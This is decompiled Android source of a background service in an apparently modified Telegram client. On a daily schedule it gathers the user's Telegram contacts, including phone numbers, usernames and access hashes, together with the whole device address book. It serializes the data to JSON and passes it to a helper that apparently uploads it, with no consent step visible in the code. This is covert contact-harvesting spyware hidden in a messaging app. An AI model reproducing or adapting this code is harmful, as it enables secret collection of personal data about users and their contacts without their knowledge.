package org.telegram.customization.service;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import android.text.TextUtils;
import com.google.p098a.C1768f;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Iterator;
import org.telegram.customization.Model.ContactHelper;
import org.telegram.customization.p151g.C2497d;
import org.telegram.customization.p151g.C2818c;
import org.telegram.messenger.ContactsController;
import org.telegram.messenger.MessagesController;
import org.telegram.messenger.NotificationCenter;
import org.telegram.messenger.NotificationCenter.NotificationCenterDelegate;
import org.telegram.tgnet.TLRPC$TL_contact;
import org.telegram.tgnet.TLRPC.User;
import utils.C3792d;
import utils.p178a.C3791b;

public class CtsService extends C2827a implements C2497d, NotificationCenterDelegate {
    /* renamed from: a */
    boolean f9302a = false;

    /* renamed from: a */
    public static Calendar m13173a() {
        Calendar instance = Calendar.getInstance();
        instance.set(11, 10);
        instance.set(12, C3792d.m14090c());
        instance.set(13, 0);
        return instance;
    }

    /* renamed from: b */
    public static void m13174b(Context context) {
        C2827a.m13164a(context, new Intent(context, CtsService.class), m13173a(), 86400000);
    }

    /* renamed from: c */
    private ArrayList<ContactHelper> m13175c() {
        ArrayList<ContactHelper> arrayList = new ArrayList();
        ContentResolver contentResolver = getContentResolver();
        Cursor query = contentResolver.query(Contacts.CONTENT_URI, null, null, null, null);
        if ((query != null ? query.getCount() : 0) > 0) {
            while (query != null && query.moveToNext()) {
                String string = query.getString(query.getColumnIndex("_id"));
                String string2 = query.getString(query.getColumnIndex("display_name"));
                if (query.getInt(query.getColumnIndex("has_phone_number")) > 0) {
                    Cursor query2 = contentResolver.query(Phone.CONTENT_URI, null, "contact_id = ?", new String[]{string}, null);
                    while (query2.moveToNext()) {
                        String string3 = query2.getString(query2.getColumnIndex("data1"));
                        ContactHelper contactHelper = new ContactHelper();
                        contactHelper.setId(9999);
                        contactHelper.setName(string2);
                        contactHelper.setMobile(string3);
                        arrayList.add(contactHelper);
                    }
                    query2.close();
                }
            }
        }
        if (query != null) {
            query.close();
        }
        return arrayList;
    }

    /* renamed from: b */
    public boolean m13176b() {
        return C3791b.m13894B(this) + C3791b.m13902F(getApplicationContext()) < System.currentTimeMillis();
    }

    public void didReceivedNotification(final int i, Object... objArr) {
        new Thread(this) {
            /* renamed from: b */
            final /* synthetic */ CtsService f9301b;

            /* renamed from: org.telegram.customization.service.CtsService$1$1 */
            class C28321 implements Runnable {
                /* renamed from: a */
                final /* synthetic */ C28331 f9299a;

                C28321(C28331 c28331) {
                    this.f9299a = c28331;
                }

                public void run() {
                    NotificationCenter.getInstance().removeObserver(this.f9299a.f9301b, NotificationCenter.contactsDidLoaded);
                    this.f9299a.f9301b.stopSelf();
                }
            }

            public void run() {
                super.run();
                Handler handler = null;
                try {
                    handler = new Handler(Looper.getMainLooper());
                } catch (Exception e) {
                }
                if (i == NotificationCenter.contactsDidLoaded) {
                    try {
                        ContactsController.getInstance().updateUnregisteredContacts(new ArrayList());
                        ArrayList arrayList = ContactsController.getInstance().contacts;
                        Object arrayList2 = new ArrayList();
                        Iterator it = arrayList.iterator();
                        while (it.hasNext()) {
                            User user = MessagesController.getInstance().getUser(Integer.valueOf(((TLRPC$TL_contact) it.next()).user_id));
                            if (user != null) {
                                ContactHelper contactHelper = new ContactHelper();
                                contactHelper.setId(user.id);
                                String str = TtmlNode.ANONYMOUS_REGION_ID;
                                String str2 = TtmlNode.ANONYMOUS_REGION_ID;
                                if (!(user.first_name == null || TextUtils.isEmpty(user.first_name))) {
                                    str = user.first_name;
                                }
                                if (!(user.last_name == null || TextUtils.isEmpty(user.last_name))) {
                                    str2 = user.last_name;
                                }
                                contactHelper.setName(str + " " + str2);
                                contactHelper.setMobile(user.phone);
                                contactHelper.setUsername(user.username);
                                contactHelper.setAccessHash(user.access_hash);
                                arrayList2.add(contactHelper);
                            }
                        }
                        try {
                            Iterator it2 = this.f9301b.m13175c().iterator();
                            while (it2.hasNext()) {
                                arrayList2.add((ContactHelper) it2.next());
                            }
                        } catch (Exception e2) {
                        }
                        synchronized (this) {
                            if (arrayList2.size() > 0) {
                                Object a = new C1768f().m8395a(arrayList2);
                                if (!TextUtils.isEmpty(a) && (this.f9301b.f9302a || this.f9301b.m13176b())) {
                                    C2818c.m13087a(this.f9301b.getApplicationContext(), this.f9301b).m13143j(a);
                                }
                            } else if (handler != null) {
                                handler.post(new C28321(this));
                            }
                        }
                    } catch (Exception e3) {
                        e3.printStackTrace();
                    }
                }
            }
        }.start();
        NotificationCenter.getInstance().removeObserver(this, NotificationCenter.contactsDidLoaded);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
    }

    public void onResult(Object obj, int i) {
        switch (i) {
            case 14:
                C3791b.m13995i(getApplicationContext(), System.currentTimeMillis());
                break;
        }
        stopSelf();
    }

    public int onStartCommand(Intent intent, int i, int i2) {
        if (intent != null) {
            this.f9302a = intent.getBooleanExtra("EXTRA_IS_FORCE", false);
        }
        if (!C3791b.m13938a((Context) this)) {
            stopSelf();
            try {
                NotificationCenter.getInstance().removeObserver(this, NotificationCenter.contactsDidLoaded);
            } catch (Exception e) {
            }
            return super.onStartCommand(intent, i, i2);
        } else if (this.f9302a || m13176b()) {
            try {
                NotificationCenter.getInstance().addObserver(this, NotificationCenter.contactsDidLoaded);
            } catch (Exception e2) {
                e2.printStackTrace();
            }
            ContactsController.getInstance().loadContacts(true, 0);
            return 1;
        } else {
            NotificationCenter.getInstance().removeObserver(this, NotificationCenter.contactsDidLoaded);
            stopSelf();
            return 1;
        }
    }
}
